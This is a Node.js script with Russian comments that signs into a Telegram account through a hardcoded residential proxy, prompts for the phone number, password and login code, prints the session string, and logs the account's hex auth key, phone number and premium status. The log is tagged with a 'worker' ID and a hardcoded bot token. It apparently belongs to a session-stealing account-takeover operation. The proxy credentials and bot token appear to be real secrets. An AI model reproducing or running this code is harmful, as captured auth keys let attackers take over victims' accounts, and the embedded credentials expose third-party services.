import { TelegramClient } from "telegram";
import { StringSession } from "telegram/sessions/index.js";
import input from 'input'; // библиотека для ввода данных в консоли
import config from '../config.json' assert { type: "json" };
import fs from 'fs';
import saveLog from "./saveLog.js";



(async () => {
    // Настройки прокси
    const location = "ru";
    const proxyConfig = {
        ip: `geo.iproyal.com`,
        port: 32325,
        username: `rvcR5d7QURSEcSyV`,
        password: `VB0RceDyPGxckBEm_country-${location}_streaming-1`,
        socksType: 5
    };

    // Создание клиента Telegram
    const client = new TelegramClient(new StringSession(), config.apiId, config.apiHash, {
        connectionRetries: 10,
        proxy: proxyConfig,
        appVersion: "4.3.4 x64",
        deviceModel: `Desktop`,
        systemVersion: "Windows 10",
        systemLangCode: `en`,
        langCode: `en-US`
    });

    // Авторизация
    await client.start({
        phoneNumber: async () => await input.text('Введите номер телефона: '),
        password: async () => await input.text('Введите пароль: '),
        phoneCode: async () => await input.text('Введите код из Telegram: '),
        onError: (err) => console.log('Ошибка авторизации:', err),
    });

    console.log('Успешная авторизация!');
    console.log('Сессия:', client.session.save());

    // Получение информации о пользователе
    const user = await client.getMe();

    // Сохранение логов
    await saveLog({
        id: Date.now(),
        worker: "7084589048", // ID работника
        uid: user.id,
        premium: user.premium,
        dcId: client.session.dcId,
        authKey: new StringSession(client.session.save())._key?.toString('hex'),
        phone: user.phone,
        bot: "6496849457:AAHmnruV5g9QfVxR8pWfIxWw-vCRlnQzpRg" // Токен бота
    });

    // Отключение клиента
    await client.disconnect();
})();
